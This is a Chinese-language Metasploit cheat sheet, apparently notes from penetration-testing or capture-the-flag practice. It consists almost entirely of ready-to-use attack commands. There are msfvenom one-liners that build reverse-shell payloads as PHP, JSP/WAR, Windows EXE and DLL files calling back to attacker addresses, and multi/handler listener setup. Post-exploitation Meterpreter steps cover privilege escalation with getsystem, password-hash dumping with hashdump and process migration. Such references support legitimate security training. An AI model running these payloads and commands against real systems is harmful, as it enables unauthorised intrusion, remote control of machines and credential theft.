

- Metasploit Framework	(MSF)

```
msfconsole	进入框架
search	查找相关漏洞
use 进入/使用模块
info 查看信息
set payload windows/x64/meterpreter/reverse_tcp	设置攻击载荷
show options 查看模块需要配置的参数
set RHOST 10.10.10.128	设置参数
run / exploit	开始攻击
backgroun 挂session到后台
```

如果漏洞利用失败一直被挂起，那就可以尝试在 sessions 中迁移 reverse shell 的进程
```
migrate -N explorer.exe
```


### 常用方法

生成一个shell.php ， 设置参数 ， R 写入的方式写到shell.php中

- PHP
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=2233 R > shell.php
```

- JSP
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.55.3 LPORT=2233 -f war > reverse.war
```

- windows
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=1337 LHOST=tun0 -f exe > shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=2233 -f exe -o rev.exe  (use nc !)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=2233 -f exe -o rev.exe  (use nc !)
```

- dll
```bash
msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST=10.10.14.29 LPORT=1337 > rev.dll
```

- exe
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=2233 -f exe -o rev.exe
set payload generic/shell_reverse_tcp

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=2233 -f exe > reverse.exe
set payload windows/x64/meterpreter/reverse_tcp 
```

### 常用模块

**反向监听的模块**
```bash
use exploit/multi/handler

set payload php/meterpreter/reverse_tcp 
set payload windows/x64/meterpreter/reverse_tcp 
set payload windows/x64/meterpreter_reverse_https
set payload generic/shell_reverse_tcp (记得设置攻击载荷!!!)
```

#### Windows CMD

```
getuid = whoami
getsystem 提权到system
ipconfig
hashdump hash转储
sysinfo
execute -H -f notepad 新建notepad
migrate 2720 迁移进程
ps
getenv
```

